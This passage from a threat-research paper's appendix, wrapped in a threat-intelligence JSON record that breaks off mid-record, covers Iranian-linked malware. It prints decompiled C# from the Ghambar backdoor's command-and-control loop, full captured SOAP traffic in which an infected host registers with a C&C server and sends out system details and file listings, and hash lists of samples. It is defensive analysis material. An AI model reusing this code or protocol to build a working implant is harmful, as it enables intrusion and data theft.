SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\n[StoragePath, DS]\n\n#### Ghambar Command Control\n\nnamespace Pavilion.Communication\n{\n\npublic class CommandControlController\n{\n\npublic static void CommandControlProc(ServiceManifest\ncommunicationChannel, string targetId)\n\n{\n\ntry\n{\n\nif (!string.IsNullOrEmpty(targetId) ||\nUtils.IsServerEndpointAvaliable())\n\n{\n\nUtils.DbgPrint(\"Plugins\");\nT4[] targetPlugins =\ncommunicationChannel.GetTargetPlugins(targetId);\n\nif (targetPlugins != null &&\ntargetPlugins.Length != 0)\n\n{\n\nnew\nCommandProcessor(communicationChannel,\ntargetId).ProcessPlugins(targetPlugins);\n\n}\nUtils.DbgPrint(\"File manager\");\nT3[] fileManagerCommands =\ncommunicationChannel.GetFileManagerCommands(targetId);\n\nif (fileManagerCommands != null &&\nfileManagerCommands.Length != 0)\n\n{\n\nnew\nCommandProcessor(communicationChannel,\ntargetId).ProcessFileManagerCommands(fileManagerCommands);\n\n}\nUtils.DbgPrint(\" GetTargetCommands\");\nT6[] targetCommands =\ncommunicationChannel.GetTargetCommands(targetId);\n\n\n48\n\n\n-----\n\nif (targetCommands != null &&\ntargetCommands.Length != 0)\n\n{\n\nnew\nCommandProcessor(communicationChannel,\ntargetId).ProcessCommands(targetCommands);\n\n}\n}\n}\ncatch (Exception ex)\n{\n\nstring name = MethodBase.GetCurrentMethod().Name;\nUtils.DbgPrint(string.Format(\"Method Name : {0} ­ Msg\n: {1}\", name, ex.Message));\n\n}\n}\n}\n}\n\n#### Ghambar Network\n\n**Request** POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1\nThe client checks­in User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web\nwith the C&C. Services Client Protocol 2.0.50727.5420)\n\nContent­Type: text/xml; charset=utf­8\nSOAPAction: \"http://tempuri.org/IBuilder/AreYouAvaliable\"\nHost: nvidia­update.com:5050\nContent­Length: 293\nExpect: 100­continue\nConnection: Keep­Alive\n\n**Response** HTTP/1.1 100 Continue\n\n**Request** <?xml version=\"1.0\" encoding=\"UTF­8\"?>\n<soap:Envelope\nxmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\">\n<soap:Body>\n<AreYouAvaliable xmlns=\"http://tempuri.org/\" />\n</soap:Body>\n</soap:Envelope>\n\n**Response** HTTP/1.1 200 OK\nContent­Length: 224\nContent­Type: text/xml; charset=utf­8\nServer: Microsoft­HTTPAPI/2.0\nDate: [REDACTED]\n\n<?xml version=\"1.0\" encoding=\"UTF­8\"?>\n\n49\n\n|Ghambar Network|Col2|\n|---|---|\n|Request The client checks­in with the C&C.|POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1 User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.5420) Content­Type: text/xml; charset=utf­8 SOAPAction: \"http://tempuri.org/IBuilder/AreYouAvaliable\" Host: nvidia­update.com:5050 Content­Length: 293 Expect: 100­continue Connection: Keep­Alive|\n|Response|HTTP/1.1 100 Continue|\n|Request|<?xml version=\"1.0\" encoding=\"UTF­8\"?> <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\"> <soap:Body> <AreYouAvaliable xmlns=\"http://tempuri.org/\" /> </soap:Body> </soap:Envelope>|\n|Response|HTTP/1.1 200 OK Content­Length: 224 Content­Type: text/xml; charset=utf­8 Server: Microsoft­HTTPAPI/2.0 Date: [REDACTED] <?xml version=\"1.0\" encoding=\"UTF­8\"?>|\n\n\n-----\n\n|Col1|<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"> <s:Body> <AreYouAvaliableResponse xmlns=\"http://tempuri.org/\"> <AreYouAvaliableResult>true</AreYouAvaliableResult> </AreYouAvaliableResponse> </s:Body> </s:Envelope>|\n|---|---|\n|Request The client requests to register the compromised host.|POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1 User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.5420) Content­Type: text/xml; charset=utf­8 SOAPAction: \"http://tempuri.org/ITargetUtils/RegisterTarget\" Host: nvidia­update.com:5050 Content­Length: 419 Expect: 100­continue|\n|Response|HTTP/1.1 100 Continue|\n|Request First the client provides some identifiers.|<?xml version=\"1.0\" encoding=\"UTF­8\"?> <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\"> <soap:Body> <RegisterTarget xmlns=\"http://tempuri.org/\"> <buildId>[BUILD ID]</buildId> <targetId>[TARGET ID]</targetId> </RegisterTarget> </soap:Body> </soap:Envelope>|\n|Response|HTTP/1.1 200 OK Content­Length: 225 Content­Type: text/xml; charset=utf­8 Server: Microsoft­HTTPAPI/2.0 Date: [REDACTED] <?xml version=\"1.0\" encoding=\"UTF­8\"?> <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"> <s:Body> <RegisterTargetResponse xmlns=\"http://tempuri.org/\"> <RegisterTargetResult>RtSuccess</RegisterTargetResult> </RegisterTargetResponse> </s:Body> </s:Envelope>|\n\n\n50\n\n\n-----\n\n|Request The client starts the check­in routine.|POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1 User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.5420) Content­Type: text/xml; charset=utf­8 SOAPAction: \"http://tempuri.org/ITargetUtils/ImOnline\" Host: nvidia­update.com:5050 Content­Length: 352 Expect: 100­continue|\n|---|---|\n|Response|HTTP/1.1 100 Continue|\n|Request|<?xml version=\"1.0\" encoding=\"UTF­8\"?> <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\"> <soap:Body> <ImOnline xmlns=\"http://tempuri.org/\"> <targetId>[TARGET ID]</targetId> </ImOnline> </soap:Body> </soap:Envelope>|\n|Response|HTTP/1.1 200 OK Content­Length: 196 Content­Type: text/xml; charset=utf­8 Server: Microsoft­HTTPAPI/2.0 Date: [REDACTED] <?xml version=\"1.0\" encoding=\"UTF­8\"?> <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"> <s:Body> <ImOnlineResponse xmlns=\"http://tempuri.org/\"> <ImOnlineResult>true</ImOnlineResult> </ImOnlineResponse> </s:Body> </s:Envelope>|\n|Request The client requests to send some generic information on the compromised host.|POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1 User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.5420) Content­Type: text/xml; charset=utf­8 SOAPAction: \"http://tempuri.org/ITargetUtils/SendTargetSystemInfo\" Host: nvidia­update.com:5050 Content­Length: 15733 Expect: 100­continue|\n|Response|HTTP/1.1 100 Continue|\n\n\n51\n\n\n-----\n\n|Request The client sends the collected information, including installed applications, network configuration, and running processes.|<?xml version=\"1.0\" encoding=\"UTF­8\"?> <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\"> <soap:Body> <SendTargetSystemInfo xmlns=\"http://tempuri.org/\"> <targetId>[TARGET ID]</targetId> <targetSystemInfo> <ComputerName xmlns=\"http://schemas.datacontract.org/2004/07/Common\">[COM PUTER NAME]</ComputerName> <IntalledApplications xmlns=\"http://schemas.datacontract.org/2004/07/Common\"> <string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/A rrays\">[name of application installed]</string> ... </IntalledApplications> <InternalIps xmlns=\"http://schemas.datacontract.org/2004/07/Common\"> <string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/A rrays\">[IPV6 IP]</string> <string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/A rrays\">[IPv4 IP]</string> </InternalIps> <Languages xmlns=\"http://schemas.datacontract.org/2004/07/Common\"> <string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/A rrays\">US</string> </Languages> <OpenPorts xmlns=\"http://schemas.datacontract.org/2004/07/Common\"> <string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/A rrays\">0.0.0.0:[PORT]</string> ... </OpenPorts> <Processes xmlns=\"http://schemas.datacontract.org/2004/07/Common\"> <string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/A rrays\">[PROCESS NAME]</string> ... </Processes> <PublicIp xmlns=\"http://schemas.datacontract.org/2004/07/Common\">[PUB LIC IP]</PublicIp>|\n|---|---|\n\n\n52\n\n\n-----\n\n|Col1|<TimeZone xmlns=\"http://schemas.datacontract.org/2004/07/Common\">[TIM EZONE]</TimeZone> <Username xmlns=\"http://schemas.datacontract.org/2004/07/Common\">[COM PUTER NAME]\\[USER NAME]</Username> </targetSystemInfo> </SendTargetSystemInfo> </soap:Body> </soap:Envelope>|\n|---|---|\n|Response|HTTP/1.1 200 OK Content­Length: 244 Content­Type: text/xml; charset=utf­8 Server: Microsoft­HTTPAPI/2.0 Date: [REDACTED] <?xml version=\"1.0\" encoding=\"UTF­8\"?> <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"> <s:Body> <SendTargetSystemInfoResponse xmlns=\"http://tempuri.org/\"> <SendTargetSystemInfoResult>true</SendTargetSystemInfoResul t> </SendTargetSystemInfoResponse> </s:Body> </s:Envelope>|\n|Request The client checks whether there are plugins to execute.|POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1 User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.5420) Content­Type: text/xml; charset=utf­8 SOAPAction: \"http://tempuri.org/IClienPluginUtils/GetTargetPlugins\" Host: nvidia­update.com:5050 Content­Length: 368 Expect: 100­continue|\n|Response|HTTP/1.1 100 Continue|\n|Request|<?xml version=\"1.0\" encoding=\"UTF­8\"?> <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\"> <soap:Body> <GetTargetPlugins xmlns=\"http://tempuri.org/\"> <targetId>[TARGET ID]</targetId> </GetTargetPlugins> </soap:Body> </soap:Envelope>|\n\n\n53\n\n\n-----\n\n|Response The server doesn’t provide any plugins.|HTTP/1.1 200 OK Content­Length: 330 Content­Type: text/xml; charset=utf­8 Server: Microsoft­HTTPAPI/2.0 Date: [REDACTED] <?xml version=\"1.0\" encoding=\"UTF­8\"?> <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"> <s:Body> <GetTargetPluginsResponse xmlns=\"http://tempuri.org/\"> <GetTargetPluginsResult xmlns:a=\"http://schemas.datacontract.org/2004/07/Server.DBM odel\" xmlns:i=\"http://www.w3.org/2001/XMLSchema­instance\" i:nil=\"true\" /> </GetTargetPluginsResponse> </s:Body> </s:Envelope>|\n|---|---|\n|Request The client checks whether there are filesystem commands to execute.|POST /D6E90421­1C45­41A4­9250­3F18B9633CE2 HTTP/1.1 User­Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.5420) Content­Type: text/xml; charset=utf­8 SOAPAction: \"http://tempuri.org/IFileManagerUtils/GetFileManagerCommand s\" Host: nvidia­update.com:5050 Content­Length: 380 Expect: 100­continue|\n|Response|HTTP/1.1 100 Continue|\n|Request|<?xml version=\"1.0\" encoding=\"UTF­8\"?> <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema­instance\"> <soap:Body> <GetFileManagerCommands xmlns=\"http://tempuri.org/\"> <targetId>[TARGET ID]</targetId> </GetFileManagerCommands> </soap:Body> </soap:Envelope>|\n|Response The server instructs the client to run the FileManager command with ID 8, which makes the|HTTP/1.1 200 OK Content­Length: 756 Content­Type: text/xml; charset=utf­8 Server: Microsoft­HTTPAPI/2.0 Date: [REDACTED] <?xml version=\"1.0\" encoding=\"UTF­8\"?>|\n\n\n54\n\n\n-----\n\nclient collect a list <s:Envelope\nof all files available xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\nacross all disks <s:Body>\n\n<GetFileManagerCommandsResponse\n\nmounted on the\n\nxmlns=\"http://tempuri.org/\">\n\ncomputer.\n\n<GetFileManagerCommandsResult\nxmlns:a=\"http://schemas.datacontract.org/2004/07/Server.DBM\nodel\" xmlns:i=\"http://www.w3.org/2001/XMLSchema­instance\">\n<a:T3>\n<a:CommandsType i:nil=\"true\" />\n\n<a:CommandsTypesID>8</a:CommandsTypesID>\n<a:ID>[ID]</a:ID>\n<a:IsSuucess>false</a:IsSuucess>\n<a:LocalStoragePath i:nil=\"true\" />\n<a:Parameter i:nil=\"true\" />\n<a:RegisterDate>[DATE]</a:RegisterDate>\n<a:RunDate i:nil=\"true\" />\n<a:Target i:nil=\"true\" />\n<a:TargetID>[TARGET ID]</a:TargetID>\n</a:T3>\n</GetFileManagerCommandsResult>\n</GetFileManagerCommandsResponse>\n</s:Body>\n</s:Envelope>\n\n#### Infy Hashes\n\n2667b356b5a36232b7fbe3cedd4c9b44b9cf4150c445cf6871fa4b2c8daac16e\n2f294d20aea4741091ddb36540b1512161ddfd3caa3831bfc44fcc75c1ba1db9\n0f7b24298e1eb983adc9244ee2ff18e0a6dba5d269d42725d5dbac17910c4daf\n3c707f1ea5bd42a1c8f48e2e34e8a2cbdfa3f305f5b38aac5427ee5fc00857a3\n16bcc5064630591b7f5a85b807704262bc7923a77b7a475b4c2cb4fe7ae7056a\nfc8b141949d008a858439af68236f8eb342273ade1c38a3e0b41ebe07788cd00\n7aaef5813058a8b14a15f81b398a53e1f241dbf246108f17871727bef6a6c98d\n39d951c330277a8b22bdd8fb64db1629b1036b16754fc0d740eee2bd009d01f7\nc3eddcbb5ccabc8090cc0bbb5772da5992fa9e33cda8ecdb541399841d281661\nc379a700975a72d0ac332e28d408d3bae0b6a7243180631d62a1df0240581742\n9c19afd0afd7dea5fabf82303898a6755df7d24b8720012e32d54bdeb3bb9ffc\n3f1fe8d7a3f0562f04c095aa3fafec48797ca114477ca3b332745d0dcca617ee\n19860e921cd2d775f51ccc03edbeab80646677a0c8152589e5f1976cba768579\nc14c039407ed833d2ee65512fe91d4a0daa8ab43350371357481ae1fbfc011e2\n2d11aabc362fd7a0359a2f8023ae51f7886d76afb25a8a49ebb9cfd57ab49b87\nfbdc4364ec9d7d09e5c9b86a0ea5f5c48a37df48d274013e91bf1893b4456f95\n13efe41a4ed172b19a60f3de751daff7612bd291539c3ebcea233043275e6ff6\n3c9319749df130c00a7b563fb99028b0dc11592da9af1fbf3349f53bb7c8cad9\n6540e3c6dbab604871f7c9b29e4471c8e02aac382aaa74930aa213786ffcc72b\na9382f4eb13ec502848efb1a85cd86a59cbb87f7e08f7ade8280c8863ee7cac8\ne3e8199cd5b6fbf0f21d52520b88821ee9944a8cb9989b950d07d99e2b6f0c9a\n46c6820b373be028dc42f190bf7c75a7b1491d56775a2797445e1cb7733009e0\n2ddb74fe0d7a1f6f633dbe575aaf7298085b414fdfc343ab26fc939fa7c0e76f\n49acbfe9afce8bd7b780d309d86319a823e0bfa302a901db997eb9a6baaffa5c\n\n|client collect a list of all files available across all disks mounted on the computer.|<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"> <s:Body> <GetFileManagerCommandsResponse xmlns=\"http://tempuri.org/\"> <GetFileManagerCommandsResult xmlns:a=\"http://schemas.datacontract.org/2004/07/Server.DBM odel\" xmlns:i=\"http://www.w3.org/2001/XMLSchema­instance\"> <a:T3> <a:CommandsType i:nil=\"true\" /> <a:CommandsTypesID>8</a:CommandsTypesID> <a:ID>[ID]</a:ID> <a:IsSuucess>false</a:IsSuucess> <a:LocalStoragePath i:nil=\"true\" /> <a:Parameter i:nil=\"true\" /> <a:RegisterDate>[DATE]</a:RegisterDate> <a:RunDate i:nil=\"true\" /> <a:Target i:nil=\"true\" /> <a:TargetID>[TARGET ID]</a:TargetID> </a:T3> </GetFileManagerCommandsResult> </GetFileManagerCommandsResponse> </s:Body> </s:Envelope>|\n|---|---|\n\n\n55\n\n\n-----\n\n2ddb74fe0d7a1f6f633dbe575aaf7298085b414fdfc343ab26fc939fa7c0e76f\n374157480f9416bc2c486c204e8bdb6e1d149f9e7dc12fb3128c6f7ca1d89ff6\n9a6104377ca2da5f3b63dfc59978f067d65c69fd0393e05650dc972c054fde59\n058b64614ef2ca5492346966846e494b93f9d531f8efe482e521d0ae44c1b2b7\nccf55307429103bf795e9d477cb15072b0c490b92b6633785df95c8f050eaf6a\n14fe3923694a47a94674e98ba33308266f06aa8d0a35673325f6ee539d78f2c1\nbcb4789fb705d16657c18c0350fd86350d8feed8f8b98385512b018f41c16b12\n04b72e7a02e12e5fd795ba0593df51c6653e257a1a65750c395db2007841118c\n03931ddb969dfd7eae16114edb31b85d0cc930a74e3302f3224054dd11ea5585\ned376d37a9d07705a33a05c33fdb2aa40d7d80d5c8d34dc681656bc1c389f151\ne355b7f1c88d8d0919d4526b113fea25902fd095a2cb934296c984d8015421dd\ne1f95a38b436afdf6a1141f07a1e092ce90740e4d6c3d85f4910e63ecbed390f\n060c1531890ab8bb5854d00355df73784b675090ee7e9e56d7aadde1b6e983ba\n0598dd550b3854380a4afe915f61ad63ca807d3adf52f4548a49290fbbf7f1e0\n9f016d21b3602ebe3f1f4db6f55e102cfb08084fd0fb2b3413b911a8f993c7f8\nab6bc6d2802ce622f5dbbeb7ab63fea48fcd78dd3755ac2226358d8c6816c3cc\n71dbd5677d812de362e82bddbe11aedbf24edf0e10a49861e3c5ae58b14d4603\n2c4740eb58ef192f43e1e2066c2820ea8c2b9e88ac54c8ac9112114d0899be7b\n3f4d7bbe3d5513b93bd354f4120c98be7a1a388f37de1049262deaa5fb7eb2ac\n55205d75a045959054d10f0dee4277679528071b9593c76a44e6f0ba30c8b305\n818de69a85e1deb79693b326afa70a8a2a384c502d6667406608f5b86c4fea2a\nbb66faefc92f3dd799db42b3835235cbee8882015c193867cd4cbf118c95aaed\ne1f95a38b436afdf6a1141f07a1e092ce90740e4d6c3d85f4910e63ecbed390f\nfd948669e9f11be95cf3f7a70c4bd0adcc7857f350ed25cbb77428f8e736f7b1\n26b87a0a8a7ac56955f5013d279b30d6559b470eaf722f607dba9e382b6d7003\n2f294d20aea4741091ddb36540b1512161ddfd3caa3831bfc44fcc75c1ba1db9\n37ca57083768b783beee896d3e1f84c96e7c0bb39d3fb7ccf09caff63ea13629\n43bd06de8cfc34a98ed59b29a9499d934bfe5aeb541a87296e5b509dd4a50514\n52f112c65a0532749f7e68790fee687a47aecd1d2ed50bfca546e79393e03fb4\n55c29dc2be5c681e7f1e6fdc1a46eaa7a3ba711820e9620707f8f41874cb0751\n5655adef4a05f29fc003ea573f10f219b3cad4d4a811c8355349118b89bb35ee\n587aac84cf62c768b2d30131cc9f7ac2d9c73c874ca49961aa2b70c5227d43cf\n6c5871fb6364c10afa2c949714108818388e609308f087ee3b57fe82b9c2d10e\n774b107fe5b1dad409039ab7c702112a31999089e33c37f5800ad8090b855c21\n7ef47f72a5b47df3a9f3830f21dd8478c87f5b178452679cebd93ce18ce27502\n8db637c4ff5d464dfa23fdd2b1bced369015b5fdfcee841549a2b5d8d2449c27\n8ec73a4032ca01ed7dd325a02e995548ca80e950f05ace36a656c35f47a835d8\nb7170b06ff9aefb8c82ac0d336cc99f75cb9b08ef71c6aa62b39497bb3c87a05\nca321cf2590cda54c6c195f89d8862090355486cfbc13283534901558a055f3a\nca50bb6c13d2f44b2e41c868d69696751abe027a58fec4a3ced32652f074c867\ncb5219513c3eb3cf8aaf10676b7976db97370a843cdb58bb2fcc2391493257b2\nd84b30a0752b9aec2fab7f32cfbf53193cb74db6d1c5c6b63b40756176e5b473\n12ab8e615eb8f2b531534e2724ebd34917539343b9f5b43d7c62860d19fb9954\n7b0bc1442036e4fed232073ffcf13322d1d5fd9b60a2b8c0f14848d6e3c4a596\n935e9fce0422e6dcbb7b7462379c31ba01da3a6475e508ab5926c1bd340b0c02\n\n#### Cleaver (Ghambar) Hashes\n\n261c5f32abb8801576ce81be2c66bca564a8a28ab5ea0954bad6bac7071e299b\n2c92da2721466bfbdaff7fedd9f3e8334b688a88ee54d7cab491e1a9df41258f\n\n\n56\n\n\n-----\n\n#### Rocket Kitten Hashes\n\nff5ff4fee5b52c6b53fd1c01790df235d65d673b927c1cc90b7020a571c21894\n0c1fe38b035a125253f4d28c08c63433f5325a113810cb7e750c80e3bfcdeea9\n333430c63c407b343fde95634d4620682ba8e660cefb6b5c17e5a473e0780024\n58b0ce144d830b2d19c47c2abf0d357d188ef923b525e748085fca7ab6b1bbb0\n3b20dc9e9eebd9457cce3d0a4a0497f36599925c4157147b116e9eb7cf7e0db7\n96590f60cf2f2c4484e4130c79738f32fac2e689bbc2ecd28dc02425ad06c38e\n\n#### Sima Hashes\n\n0fa3583fb34ab722129f64a5ee2aeec353152988e505a042da3ba26955ee35f4\n11cad49a9b0a811db4e159e8802d25e96b5d7a3d35abfe1875de59de85a4a547\n37e9d941b603e364dfabb1738b9257800d1fb0d17c2674385165683f69e86d62\n6540e3c6dbab604871f7c9b29e4471c8e02aac382aaa74930aa213786ffcc72b\ndac3a657ef25701895bcc8b76eab4d72d8469917dbd3adef2865ed1777a42f74\nec55ba45ac6aa9dd60c7210c02271476d41f05e9ce12bbb2c4d9e39ce6b83bf7\n\n\n57\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.08.11.Iran-And-The-Soft-War-For-Internet-Dominance/us-16-Guarnieri-Anderson-Iran-And-The-Soft-War-For-Internet-Dominance-paper.pdf",
        "https://iranthreats.github.io/us-16-Guarnieri-Anderson-Iran-And-The-Soft-War-For-Internet-Dominance-paper.pdf",
        "https://www.blackhat.com/docs/us-16/materials/us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf"
    ],
    "report_names": [
        "us-16-Guarnieri-Anderson-Iran-And-The-Soft-War-For-Internet-Dominance-paper",
        "us-16-Guarnieri-Anderson-Iran-And-The-Soft-War-For-Internet-Dominance-paper.pdf",
        "us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf"
    ],
    "threat_actors": [
        {
            "id": "8e1bae2f-2a21-4ba8-a6f1-42155f96aec8",
            "created_at": "2022-10-25T16:07:23.645758Z",
            "updated_at": "2025-03-27T02:02:09.905135Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Ajax Security Team",
                "Flying Kitten",
                "Group 26",
                "Operation Saffron Rose"
            ],
            "source_name": "ETDA:Flying Kitten",
            "tools": [
                "Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b07fec96-80cd-4d92-aa52-a26a0b25b7c2",
            "created_at": "2022-10-25T16:07:23.826594Z",
            "updated_at": "2025-03-27T02:02:09.994638Z",
            "deleted_at": null,
            "main_name": "Madi",
            "aliases": [
                "Mahdi"
            ],
            "source_name": "ETDA:Madi",
            "tools": [
                "Madi"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
            "created_at": "2022-10-25T16:07:24.133537Z",
            "updated_at": "2025-03-27T02:02:10.118581Z",
            "deleted_at": null,
            "main_name": "Rocket Kitten",
            "aliases": [
                "Group 83",
                "NewsBeef",
                "Newscaster",
                "Operation Newscaster",
                "Operation Woolen-GoldFish",
                "Parastoo",
                "Rocket Kitten"
            ],
            "source_name": "ETDA:Rocket Kitten",
            "tools": [
                "CoreImpact (Modified)",
                "FireMalv",
                "Ghole",
                "Gholee"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8faa11f5-2a14-479c-9ea8-3779e6de9749",
            "created_at": "2022-10-25T15:50:23.814205Z",
            "updated_at": "2025-03-27T02:00:55.551798Z",
            "deleted_at": null,
            "main_name": "Ajax Security Team",
            "aliases": [
                "Ajax Security Team",
                "Operation Woolen-Goldfish",
                "AjaxTM",
                "Rocket Kitten",
                "Flying Kitten",
                "Operation Saffron Rose"
            ],
            "source_name": "MITRE:Ajax Security Team",
            "tools": [
                "sqlmap",
                "Havij"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4d7cba1-dbdd-42a9-88c5-4d0c81659ee0",
            "created_at": "2023-01-06T13:46:38.357581Z",
            "updated_at": "2025-03-27T02:00:02.813318Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Saffron Rose",
                "AjaxSecurityTeam",
                "Ajax Security Team",
                "Group 26",
                "Sayad",
                "SaffronRose"
            ],
            "source_name": "MISPGALAXY:Flying Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "322a0ef1-136b-400e-89d0-0d62ee2bd319",
            "created_at": "2023-01-06T13:46:38.662109Z",
            "updated_at": "2025-03-27T02:00:02.885938Z",
            "deleted_at": null,
            "main_name": "Madi",
            "aliases": [],
            "source_name": "MISPGALAXY:Madi",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "49f1ada0-181f-4e89-a449-e6bc13c8c6b1",
            "created_at": "2022-10-25T15:50:23.561511Z",
            "updated_at": "2025-03-27T02:00:55.499988Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Threat Group 2889",
                "TG-2889"
            ],
            "source_name": "MITRE:Cleaver",
            "tools": [
                "Net Crawler",
                "PsExec",
                "TinyZBot",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "257efa81-fa09-4318-ac8f-7e32b54b88bb",
            "created_at": "2022-10-25T16:07:24.195026Z",
            "updated_at": "2025-03-27T02:02:10.137742Z",
            "deleted_at": null,
            "main_name": "Sima",
